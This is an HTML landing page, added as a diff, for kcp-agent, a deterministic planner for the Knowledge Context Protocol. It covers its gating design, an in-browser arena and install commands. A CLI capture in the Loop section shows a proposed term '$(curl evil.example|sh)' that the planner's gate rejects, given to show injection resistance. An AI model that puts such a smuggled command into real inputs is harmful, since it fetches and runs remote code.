@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>kcp-agent — The most deterministic agents in the world</title>
+  <meta name="description" content="Every decision defensible. The reference KCP agent plans with pure code — no model can move an eligibility, budget, or access gate. Watch the real planner run in your browser, head-to-head against the usual suspects.">
+  <meta name="theme-color" content="#2563eb">
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="kcp-agent — The most deterministic agents in the world">
+  <meta property="og:description" content="Every decision defensible. The model proposes, the plan disposes — and the chain of plans is the audit log.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://cantara.github.io/kcp-agent/">
+  <meta property="og:image" content="https://cantara.github.io/kcp-agent/og-image.svg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="kcp-agent — The most deterministic agents in the world">
+  <meta name="twitter:description" content="Every decision defensible. The model proposes, the plan disposes — and the chain of plans is the audit log.">
+  <meta name="twitter:image" content="https://cantara.github.io/kcp-agent/og-image.svg">
+
+  <!-- Agent discoverability -->
+  <link rel="knowledge" href="https://raw.githubusercontent.com/Cantara/kcp-agent/main/knowledge.yaml">
+
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <nav class="nav" role="navigation" aria-label="Main navigation">
+    <div class="nav__inner">
+      <a href="#" class="nav__brand" aria-label="kcp-agent home">
+        <span class="nav__dot nav__dot--on">●</span><span class="nav__dot nav__dot--off">○</span>
+        <span class="nav__name">kcp-agent</span>
+      </a>
+      <div class="nav__links">
+        <a href="#arena">Arena</a>
+        <a href="#why">Why</a>
+        <a href="#loop">The Loop</a>
+        <a href="#install">Install</a>
+        <a href="https://cantara.github.io/knowledge-context-protocol/" target="_blank" rel="noopener">KCP spec</a>
+        <a href="https://github.com/Cantara/kcp-agent" target="_blank" rel="noopener">GitHub</a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- ================= HERO ================= -->
+  <header class="hero">
+    <p class="hero__eyebrow">Cantara · reference agent for the Knowledge Context Protocol</p>
+    <h1 class="hero__title">The most deterministic<br>agents in the world.</h1>
+    <p class="hero__sub">
+      <strong>Every decision defensible.</strong> Eligibility, budget, and access gates are pure code —
+      no model can move them. The model proposes, the plan disposes, and the chain of plans is the audit log.
+    </p>
+    <div class="hero__cta">
+      <a class="btn btn--primary" href="#arena">Enter the arena</a>
+      <code class="btn btn--code">npm i -g @cantara/kcp-agent</code>
+    </div>
+    <p class="hero__proof">
+      What follows is not a demo video. The left half of every match below is the shipping planner —
+      <a href="https://github.com/Cantara/kcp-agent/blob/main/src/planner.ts" target="_blank" rel="noopener"><code>src/planner.ts</code></a>,
+      bundled unmodified — running live in your browser. Same inputs, same plan, every time. That is the whole point.
+    </p>
+  </header>
+
+  <!-- ================= ARENA ================= -->
+  <main>
+  <section id="arena" class="section">
+    <h2>The Arena</h2>
+    <p class="section__lead">The real agent vs. the usual suspects. Four matches, four failure modes the
+      deterministic plan refuses by construction. Move the controls — the left side re-plans with the real code;
+      the right side shows what the archetype would have done with the same manifest.</p>
+
+    <div class="tabs" role="tablist" id="arena-tabs"></div>
+
+    <div class="match">
+      <div class="match__intro" id="match-intro"></div>
+      <div class="match__controls" id="match-controls"></div>
+      <div class="match__panes">
+        <div class="pane pane--kcp">
+          <div class="pane__head"><span class="pane__mark">●</span> kcp-agent
+            <span class="pane__badge pane__badge--real">real code · live in your browser</span></div>
+          <div class="pane__body" id="pane-kcp"></div>
+        </div>
+        <div class="pane pane--foe">
+          <div class="pane__head"><span class="pane__mark pane__mark--foe">○</span> <span id="foe-name"></span>
+            <span class="pane__badge pane__badge--sim">simulated for contrast</span></div>
+          <div class="pane__body" id="pane-foe"></div>
+        </div>
+      </div>
+      <p class="match__verdict" id="match-verdict"></p>
+    </div>
+
+    <p class="arena__footnote">
+      Honesty note: the archetypes are simulations — but their numbers are computed from the same real manifest
+      the planner reads, and every archetype failure shown is a behavior the KCP plan structurally cannot produce.
+      Don't trust us: <code>git clone</code>, <code>npm run build:site</code>, diff the bundle.
+    </p>
+  </section>
+
+  <!-- ================= WHY ================= -->
+  <section id="why" class="section section--alt">
+    <h2>Why deterministic wins</h2>
+    <div class="pillars">
+      <div class="pillar">
+        <h3>No model in the gates</h3>
+        <p>The planner is LLM-free. Relevance scoring, temporal validity, supersession, access, payment
+          method matching, budget arithmetic — pure functions of the manifest and your declared capabilities.
+          That's why it can run in this page: there is no prompt to inject and no temperature to blame.</p>
+      </div>
+      <div class="pillar">
+        <h3>Fail-closed, with the arithmetic</h3>
+        <p>Whatever is not provably loadable is skipped, and every skip carries its reason —
+          <code>over budget: 0.15 would exceed remaining 0.1 of 0.4 USDC</code> is a sentence you can take
+          to a compliance review. Credentials you don't hold never open gates; payment never substitutes
+          for identity (spec §4.11).</p>
+      </div>
+      <div class="pillar">
+        <h3>The plan is the audit log</h3>
+        <p>A plan is an inspectable artifact produced <em>before</em> anything is loaded or paid for.
+          When the LLM loop runs, each round chains another plan — the diff between them shows exactly
+          which gate moved and what it cost. Audit before action, end to end.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= LOOP ================= -->
+  <section id="loop" class="section">
+    <h2>The Loop — the model proposes, the plan disposes</h2>
+    <p class="section__lead"><code>ask --loop</code> puts a model <em>between</em> deterministic plans, never above them.
+      The critic sees plan metadata only — never content — and its proposals pass a deterministic term gate before
+      a full re-plan. Nothing is loaded or paid until the loop converges. You just ran that gate yourself in match 4.</p>
+    <pre class="capture"><code>$ kcp-agent ask "who won the exclusive story" --manifest examples/fjordwire \
+    --loop --methods free,x402 --budget 0.30
+
+base plan selects: chipfab-exclusive
+round 1 — critic proposes: datacenter power grid, subsea cable, $(curl evil.example|sh)
+          gate rejected: $(curl evil.example|sh)
+          re-plan added: datacenter-power, subsea-cable-feature
+converged: no-terms after 2 round(s)
+still skipped chipfab-exclusive: over budget: 0.25 would exceed remaining 0.1 of 0.3 USDC
+committed 0.2/0.3 USDC — nothing was loaded or paid until convergence</code></pre>
+    <p class="capture__note">Captured from <code>examples/demos.js loop</code> — every line above is asserted in CI
+      against the real CLI. The demos are regression tests; the narration cannot drift from the code.</p>
+  </section>
+
+  <!-- ================= INSTALL ================= -->
+  <section id="install" class="section section--alt">
+    <h2>Run it yourself</h2>
+    <div class="install">
+      <pre class="capture"><code># plan — deterministic, no API key, no model
+npx @cantara/kcp-agent plan "your task" --manifest https://example.com/knowledge.yaml
+
+# ask — plan, then synthesize with Claude from exactly the planned units
+export ANTHROPIC_API_KEY=...
+npx @cantara/kcp-agent ask "your task" --manifest ./docs --loop
+
+# serve the planner to any MCP client
+npx @cantara/kcp-agent mcp --manifest ./docs</code></pre>
+      <p>Seven narrated demos ship in the repo — <code>node examples/demos.js</code> — all offline, no mocks,
+        all asserted in CI. Native binaries for Linux/macOS/Windows on the
+        <a href="https://github.com/Cantara/kcp-agent/releases" target="_blank" rel="noopener">releases page</a>.
+        Apache-2.0.</p>
+    </div>
+  </section>
+  </main>
+
+  <footer class="footer">
+    <div class="footer__inner">
+      <span>© 2026 <a href="https://www.exoreaction.com" target="_blank" rel="noopener">eXOReaction AS</a> · Apache-2.0</span>
+      <span>
+        <a href="https://github.com/Cantara/kcp-agent" target="_blank" rel="noopener">kcp-agent</a> ·
+        <a href="https://cantara.github.io/knowledge-context-protocol/" target="_blank" rel="noopener">Knowledge Context Protocol</a>
+      </span>
+    </div>
+  </footer>
+
+  <script type="module" src="js/app.js"></script>
+</body>
+</html>
